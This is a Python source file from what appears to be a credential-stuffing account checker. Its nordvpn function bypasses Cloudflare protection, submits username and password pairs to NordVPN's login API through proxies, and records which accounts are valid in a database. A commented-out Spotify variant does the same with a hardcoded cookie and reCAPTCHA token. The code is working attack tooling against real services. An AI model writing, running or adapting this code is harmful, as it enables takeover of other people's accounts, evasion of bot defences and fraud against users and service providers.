import logging as log


# def test_spotify(self, creds):
#     site_get = "https://accounts.spotify.com/it/login"
#     cookies = self.req.get(site_get).cookies.get_dict()
#     csrf = cookies["csrf_token"]
#     cookies["__bon"] = "MHwwfC00ODY2MjU5N3wtMjA0MzgyOTA3NHwxfDF8MXwx"  # Non me gusta hardcodarlo
    # site_post=site_get
    # site_post = "https://accounts.spotify.com/password/login/"
    # usr = creds.split(":")[0].strip()
    # pwd = creds.split(":")[1].strip()
    # self.req.headers.update({"content-length": str(9999)})
    # account_proxy = self.set_random_proxyy()
    # recaptcha="3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
    # res = self.post_with_checks(site_post,
    #                             data={"username": usr, "password": pwd, "csrf_token": csrf},
    #                             cookies=cookies)
    # print(res.content)


def nordvpn(usr, pwd, mr):
    """
    Custom functions must have 3 params: username and password to check, and a ManageRequests object
    The MR object has all the primitives that you need.
    Remember to update the database via mr.db
    """

    sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
    siteGet = "https://ucp.nordvpn.com/login"
    # Retrieve CF valid cookie

    cookies = mr.bypass_cf(siteGet)
    # change proxy account
    res = mr.post_with_checks(sitePost,
                              data={"username": usr, "password": pwd}, cookies=cookies)
    res = dict(res.cookies).get("token", None)

    # check if inside the cookie the token is set, if positive the account is valid
    if res:
        mr.db.update_result(usr, pwd, "nordvpn", "True")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "True")
        log.info("Account valid {}".format(usr))
    else:
        mr.db.update_result(usr, pwd, "nordvpn", "False")
        mr.db.update_result(usr, pwd, "nordvpnProxy", "False")
        log.info("Account error {} {}".format(usr, pwd))
    log.info("-------------------------------")
    mr.req.cookies.clear()



